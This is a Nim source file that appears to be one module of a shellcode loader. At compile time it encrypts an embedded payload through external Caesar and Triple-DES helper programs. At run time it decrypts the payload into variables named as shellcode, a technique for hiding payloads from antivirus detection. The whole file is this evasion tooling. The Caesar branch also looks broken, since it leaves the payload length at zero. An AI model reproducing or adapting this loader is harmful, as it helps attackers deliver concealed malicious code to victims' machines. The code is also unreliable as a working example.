{.passL:"-static"}
# {.hint[XDeclaredButNotUsed]:off.}
# {.passL:"-D:_WIN32_WINNT=0x0602"}
{.compile: "encryption\\des.c".}
import base64

const source {.strdefine.}: string = ""
var code*:cstring
var codelen*:cint = 0
const currsource:string = "\"" & source & "\""

when defined(Caesar):
    import sequtils
    proc caesar(result:string): void =
        let decodres = decode(result)
        let dic = decodres[0..255].mapIt(it.byte)
        let table = decodres[256..high(decodres)].mapIt(it.byte)
        var deshellcode = newSeq[uint8](table.len)
        var temp:string = ""
        temp.setLen(table.len)
        for i in 0..254:
            for k in 0..high(table):
                temp[k] = cast[cchar](dic[table[k]])
        code = cstring(temp)
        codelen = cast[cint](deshellcode.len)
    const enbase64 = staticExec("encryption\\Caesar.exe " & currsource)
    caesar(enbase64)

elif defined(TDEA):
    proc D3DES_Decrypt(plainBuffer:cstring,keyBuffer:cstring,cipherBuffer:cstring,n:cint):cint {.importc,cdecl.}
    proc de3des(enbase64:string): void =
        let shellcode:string = decode(enbase64) 
        let plain_len_byte = cast[int16]([shellcode[0],shellcode[1]])
        let input_encode:cstring = cstring(shellcode[26..high(shellcode)])
        let key:cstring = cstring(shellcode[2..25])
        code = cast[cstring](alloc0(plain_len_byte));
        discard D3DES_Decrypt(input_encode,key,code,cast[cint](plain_len_byte))
        codelen = plain_len_byte
    const enbase64 = staticExec("encryption\\Tdea.exe " & currsource)
    de3des(enbase64)